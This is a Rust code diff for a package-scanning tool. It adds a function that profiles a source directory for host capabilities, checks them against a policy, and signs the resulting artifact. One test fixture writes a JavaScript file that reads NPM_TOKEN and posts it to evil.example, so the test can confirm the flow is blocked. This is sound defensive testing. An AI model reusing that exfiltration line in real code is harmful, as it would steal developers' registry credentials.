@@ -605,6 +605,24 @@ pub struct OmcArtifact {
     pub signature: Option<ArtifactSignature>,
 }
 
+#[derive(Debug, Clone)]
+pub struct CompileSourceOptions {
+    pub project_dir: PathBuf,
+    pub source_path: PathBuf,
+    pub ecosystem: Ecosystem,
+    pub name: String,
+    pub version: String,
+    pub allowed_capabilities: Vec<Capability>,
+    pub allowed_flows: Vec<FlowRule>,
+    pub write_artifact: bool,
+}
+
+#[derive(Debug, Clone)]
+pub struct CompileSourceReport {
+    pub artifact: OmcArtifact,
+    pub artifact_path: Option<PathBuf>,
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ArtifactPackage {
     pub ecosystem: Ecosystem,
@@ -16413,6 +16431,206 @@ fn grants_all_host_capabilities(capabilities: &[Capability]) -> bool {
             .any(|capability| matches!(capability, Capability::DynamicEval))
 }
 
+pub fn compile_source_path(options: CompileSourceOptions) -> Result<CompileSourceReport> {
+    let source_path = fs::canonicalize(&options.source_path)?;
+    let source_url = file_url_from_path(&source_path, "compile source path")?;
+    let filename = source_path
+        .file_name()
+        .and_then(|name| name.to_str())
+        .unwrap_or("source")
+        .to_owned();
+    let package = ResolvedPackage {
+        ecosystem: options.ecosystem,
+        name: options.name.clone(),
+        version: options.version.clone(),
+        source_url: source_url.clone(),
+        download_url: None,
+        local_path: Some(source_path.clone()),
+        filename,
+        expected_sha256: None,
+        expected_sha1: None,
+        expected_integrity: None,
+        npm_direct_tarball: false,
+        pypi_direct_wheel: false,
+        npm_scripts: BTreeMap::new(),
+        platform_compatible: true,
+        dependencies: Vec::new(),
+    };
+    let (source_sha256, profile) = if source_path.is_dir() {
+        (
+            hash_profiled_directory(&source_path)?,
+            profile_source_directory(&source_path)?,
+        )
+    } else {
+        let bytes = fs::read(&source_path)?;
+        (sha256_hex(&bytes), profile_archive(&package, &bytes)?)
+    };
+    let module = module_from_profile(&package, &profile.capabilities);
+    let explicit_grants_all_host = grants_all_host_capabilities(&options.allowed_capabilities);
+    let policy = default_public_capabilities()
+        .into_iter()
+        .chain(options.allowed_capabilities.iter().cloned())
+        .fold(Policy::pure(), Policy::allow_capability);
+    let policy = options
+        .allowed_flows
+        .iter()
+        .cloned()
+        .fold(policy, Policy::allow_flow_rule);
+    let policy = if explicit_grants_all_host {
+        policy.allow_all_flows()
+    } else {
+        policy
+    };
+    let verifier_findings = verify_module(&module, &policy)
+        .err()
+        .map(|error| {
+            error
+                .findings
+                .into_iter()
+                .map(render_verify_finding)
+                .collect::<Vec<_>>()
+        })
+        .unwrap_or_default();
+    let verdict = if verifier_findings.is_empty() {
+        Verdict::Accepted
+    } else {
+        Verdict::Blocked
+    };
+    let behavior = if profile.capabilities.is_empty() {
+        Behavior::Pure
+    } else {
+        Behavior::HostCapability
+    };
+    let mut artifact = OmcArtifact {
+        schema: ARTIFACT_SCHEMA,
+        package: ArtifactPackage {
+            ecosystem: options.ecosystem,
+            name: options.name,
+            version: options.version,
+        },
+        source_url,
+        source_sha256,
+        compiler: "omc-prototype-source-profiler".to_owned(),
+        microcode: module,
+        behavior,
+        verdict,
+        grants: options
+            .allowed_capabilities
+            .iter()
+            .map(ToString::to_string)
+            .collect(),
+        dependencies: Vec::new(),
+        optional_dependencies: Vec::new(),
+        peer_dependencies: Vec::new(),
+        files_scanned: profile.files_scanned,
+        capabilities: profile.capabilities,
+        verifier_findings,
+        signature: None,
+    };
+    sign_artifact(&options.project_dir, &mut artifact)?;
+    let artifact_path = if options.write_artifact {
+        Some(write_artifact(&options.project_dir, &package, &artifact)?)
+    } else {
+        None
+    };
+
+    Ok(CompileSourceReport {
+        artifact,
+        artifact_path,
+    })
+}
+
+fn file_url_from_path(path: &Path, description: &str) -> Result<String> {
+    reqwest::Url::from_file_path(path)
+        .map(|url| url.to_string())
+        .map_err(|_| {
+            OmcRegistryError::UnsupportedSpec(format!(
+                "{description} `{}` could not be converted to a file URL",
+                path.display()
+            ))
+        })
+}
+
+fn profile_source_directory(root: &Path) -> Result<ArchiveProfile> {
+    let mut profiler = SourceProfiler::default();
+    for entry in WalkDir::new(root)
+        .follow_links(false)
+        .into_iter()
+        .filter_entry(should_enter_source_profile_dir)
+        .filter_map(std::result::Result::ok)
+    {
+        if !entry.file_type().is_file() || fs::metadata(entry.path())?.len() > MAX_FILE_BYTES {
+            continue;
+        }
+        let relative = source_profile_relative_path(root, entry.path());
+        let content = fs::read_to_string(entry.path()).unwrap_or_default();
+        profiler.scan_file(&relative, &content);
+    }
+    Ok(profiler.finish())
+}
+
+fn hash_profiled_directory(root: &Path) -> Result<String> {
+    let mut files = WalkDir::new(root)
+        .follow_links(false)
+        .into_iter()
+        .filter_entry(should_enter_source_profile_dir)
+        .filter_map(std::result::Result::ok)
+        .filter(|entry| {
+            entry.file_type().is_file()
+                && entry
+                    .metadata()
+                    .map(|metadata| metadata.len() <= MAX_FILE_BYTES)
+                    .unwrap_or(false)
+        })
+        .map(|entry| entry.path().to_path_buf())
+        .collect::<Vec<_>>();
+    files.sort();
+
+    let mut digest = Sha256::new();
+    for path in files {
+        let relative = source_profile_relative_path(root, &path);
+        digest.update(relative.as_bytes());
+        digest.update([0]);
+        let bytes = fs::read(&path)?;
+        digest.update((bytes.len() as u64).to_le_bytes());
+        digest.update([0]);
+        digest.update(bytes);
+        digest.update([0]);
+    }
+    Ok(hex::encode(digest.finalize()))
+}
+
+fn source_profile_relative_path(root: &Path, path: &Path) -> String {
+    path.strip_prefix(root)
+        .unwrap_or(path)
+        .to_string_lossy()
+        .replace('\\', "/")
+}
+
+fn should_enter_source_profile_dir(entry: &DirEntry) -> bool {
+    if entry.depth() == 0 || !entry.file_type().is_dir() {
+        return true;
+    }
+
+    !matches!(
+        entry.file_name().to_str(),
+        Some(
+            "node_modules"
+                | ".git"
+                | ".omc"
+                | "target"
+                | "build"
+                | "dist"
+                | "venv"
+                | ".venv"
+                | ".tox"
+                | ".mypy_cache"
+                | ".pytest_cache"
+                | "__pycache__"
+        )
+    )
+}
+
 #[derive(Debug, Default)]
 struct SourceProfiler {
     files_scanned: usize,
@@ -24115,6 +24333,73 @@ wheels = [
         assert!(error.findings.iter().any(|finding| finding
             .message
             .contains("env:NPM_TOKEN may not flow to network:evil.example")));
+    }
+
+    #[test]
+    fn compile_source_directory_emits_signed_verifiable_artifact() {
+        let dir = tempfile::tempdir().unwrap();
+        let source = dir.path().join("source");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(
+            source.join("index.js"),
+            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/upload', { body: token });\n",
+        )
+        .unwrap();
+        fs::create_dir_all(source.join("node_modules/noisy")).unwrap();
+        fs::write(
+            source.join("node_modules/noisy/index.js"),
+            "fetch('https://ignored.example')\n",
+        )
+        .unwrap();
+
+        let report = compile_source_path(CompileSourceOptions {
+            project_dir: dir.path().to_path_buf(),
+            source_path: source,
+            ecosystem: Ecosystem::Npm,
+            name: "date-helper".to_owned(),
+            version: "1.2.4".to_owned(),
+            allowed_capabilities: vec![
+                Capability::EnvRead("NPM_TOKEN".to_owned()),
+                Capability::HttpHost("evil.example".to_owned()),
+            ],
+            allowed_flows: Vec::new(),
+            write_artifact: true,
+        })
+        .unwrap();
+
+        assert_eq!(report.artifact.package.name, "date-helper");
+        assert_eq!(report.artifact.files_scanned, 1);
+        assert_eq!(report.artifact.behavior, Behavior::HostCapability);
+        assert_eq!(report.artifact.verdict, Verdict::Blocked);
+        assert!(report
+            .artifact
+            .capabilities
+            .iter()
+            .any(
+                |finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"
+            ));
+        assert!(report
+            .artifact
+            .capabilities
+            .iter()
+            .any(|finding| finding.kind == CapabilityKind::HttpRequest
+                && finding.target == "evil.example"));
+        assert!(!report
+            .artifact
+            .capabilities
+            .iter()
+            .any(|finding| finding.target == "ignored.example"));
+        assert!(report
+            .artifact
+            .verifier_findings
+            .iter()
+            .any(|finding| finding.contains("env:NPM_TOKEN may not flow to network:evil.example")));
+        verify_artifact_signature(&report.artifact).unwrap();
+        let artifact_path = report.artifact_path.unwrap();
+        assert!(artifact_path.ends_with("omc.json"));
+        let stored: OmcArtifact =
+            serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
+        verify_artifact_signature(&stored).unwrap();
     }
 
     #[test]
